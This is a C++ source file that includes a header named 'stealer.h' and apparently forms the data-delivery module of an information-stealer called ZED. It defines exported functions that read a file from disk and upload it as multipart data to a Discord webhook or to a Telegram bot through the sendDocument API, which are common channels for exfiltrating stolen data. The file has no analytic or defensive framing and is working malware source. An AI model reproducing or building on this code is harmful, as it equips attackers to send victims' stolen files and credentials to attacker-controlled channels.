#include "stealer.h"
#include <windows.h>
#include <winhttp.h>
#include <string>
#include <fstream>
#include <vector>
#include <sstream>
#include <cstring>

#pragma comment(lib, "winhttp.lib")

static std::wstring to_wstring(const std::string& s) {
    int n = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, nullptr, 0);
    std::wstring ws(n - 1, L'\0');
    MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, ws.data(), n);
    return ws;
}

static std::string generate_boundary() {
    return "----ZedBoundary7f2a9b3c";
}

static std::vector<BYTE> build_multipart(
    const std::string& boundary,
    const std::string& message,
    const std::string& filename,
    const std::vector<BYTE>& file_data)
{
    std::ostringstream head;
    if (!message.empty()) {
        head << "--" << boundary << "\r\n"
             << "Content-Disposition: form-data; name=\"content\"\r\n\r\n"
             << message << "\r\n";
    }
    head << "--" << boundary << "\r\n"
         << "Content-Disposition: form-data; name=\"file\"; filename=\"" << filename << "\"\r\n"
         << "Content-Type: application/octet-stream\r\n\r\n";
    std::string tail = "\r\n--" + boundary + "--\r\n";

    std::string head_str = head.str();
    std::vector<BYTE> body;
    body.insert(body.end(), head_str.begin(), head_str.end());
    body.insert(body.end(), file_data.begin(), file_data.end());
    body.insert(body.end(), tail.begin(), tail.end());
    return body;
}

extern "C" {

int zed_deliver_discord(const char* webhook_url, const char* file_path, const char* message) {
    std::string url_str(webhook_url);

    // Parse URL
    URL_COMPONENTS comps = {};
    comps.dwStructSize         = sizeof(comps);
    wchar_t host_buf[256]      = {};
    wchar_t path_buf[1024]     = {};
    comps.lpszHostName         = host_buf;
    comps.dwHostNameLength     = 256;
    comps.lpszUrlPath          = path_buf;
    comps.dwUrlPathLength      = 1024;

    std::wstring wurl = to_wstring(url_str);
    if (!WinHttpCrackUrl(wurl.c_str(), 0, 0, &comps))
        return 0;

    // Read file
    std::ifstream fin(file_path, std::ios::binary);
    if (!fin.is_open()) return 0;
    std::vector<BYTE> file_data((std::istreambuf_iterator<char>(fin)),
                                 std::istreambuf_iterator<char>());

    std::string boundary = generate_boundary();
    std::string fname = std::string(file_path);
    size_t slash = fname.rfind('\\');
    if (slash != std::string::npos) fname = fname.substr(slash + 1);

    auto body = build_multipart(boundary, message ? message : "", fname, file_data);
    std::string content_type = "multipart/form-data; boundary=" + boundary;

    HINTERNET hSession = WinHttpOpen(L"ZEDClient/1.0",
                                     WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                     WINHTTP_NO_PROXY_NAME,
                                     WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return 0;

    HINTERNET hConnect = WinHttpConnect(hSession, host_buf, comps.nPort, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return 0; }

    DWORD flags = (comps.nPort == 443) ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", path_buf,
                                            nullptr, WINHTTP_NO_REFERER,
                                            WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return 0;
    }

    std::wstring wct = to_wstring(content_type);
    WinHttpAddRequestHeaders(hRequest, (L"Content-Type: " + wct).c_str(), -1L, WINHTTP_ADDREQ_FLAG_ADD);

    BOOL sent = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                   body.data(), (DWORD)body.size(), (DWORD)body.size(), 0);
    int status = 0;
    if (sent && WinHttpReceiveResponse(hRequest, nullptr)) {
        DWORD sz = sizeof(status);
        WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                            WINHTTP_HEADER_NAME_BY_INDEX, &status, &sz, WINHTTP_NO_HEADER_INDEX);
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return status;
}

int zed_deliver_telegram(const char* bot_token, const char* chat_id,
                         const char* file_path, const char* caption)
{
    std::string api_path = "/bot" + std::string(bot_token) + "/sendDocument";
    std::string host     = "api.telegram.org";

    std::ifstream fin(file_path, std::ios::binary);
    if (!fin.is_open()) return 0;
    std::vector<BYTE> file_data((std::istreambuf_iterator<char>(fin)),
                                 std::istreambuf_iterator<char>());

    std::string boundary = generate_boundary();
    std::string fname = std::string(file_path);
    size_t slash = fname.rfind('\\');
    if (slash != std::string::npos) fname = fname.substr(slash + 1);

    // Build multipart manually for Telegram (needs chat_id and caption fields)
    std::ostringstream head;
    head << "--" << boundary << "\r\n"
         << "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n"
         << chat_id << "\r\n";
    if (caption && strlen(caption) > 0) {
        head << "--" << boundary << "\r\n"
             << "Content-Disposition: form-data; name=\"caption\"\r\n\r\n"
             << caption << "\r\n";
    }
    head << "--" << boundary << "\r\n"
         << "Content-Disposition: form-data; name=\"document\"; filename=\"" << fname << "\"\r\n"
         << "Content-Type: application/octet-stream\r\n\r\n";
    std::string tail = "\r\n--" + boundary + "--\r\n";

    std::string head_str = head.str();
    std::vector<BYTE> body;
    body.insert(body.end(), head_str.begin(), head_str.end());
    body.insert(body.end(), file_data.begin(), file_data.end());
    body.insert(body.end(), tail.begin(), tail.end());

    std::wstring whost = to_wstring(host);
    HINTERNET hSession = WinHttpOpen(L"ZEDClient/1.0",
                                     WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                     WINHTTP_NO_PROXY_NAME,
                                     WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return 0;

    HINTERNET hConnect = WinHttpConnect(hSession, whost.c_str(), 443, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return 0; }

    std::wstring wpath = to_wstring(api_path);
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", wpath.c_str(),
                                            nullptr, WINHTTP_NO_REFERER,
                                            WINHTTP_DEFAULT_ACCEPT_TYPES,
                                            WINHTTP_FLAG_SECURE);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return 0;
    }

    std::string content_type = "multipart/form-data; boundary=" + boundary;
    std::wstring wct = to_wstring(content_type);
    WinHttpAddRequestHeaders(hRequest, (L"Content-Type: " + wct).c_str(), -1L, WINHTTP_ADDREQ_FLAG_ADD);

    BOOL sent = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                   body.data(), (DWORD)body.size(), (DWORD)body.size(), 0);
    int status = 0;
    if (sent && WinHttpReceiveResponse(hRequest, nullptr)) {
        DWORD sz = sizeof(status);
        WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                            WINHTTP_HEADER_NAME_BY_INDEX, &status, &sz, WINHTTP_NO_HEADER_INDEX);
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return status;
}

} // extern "C"
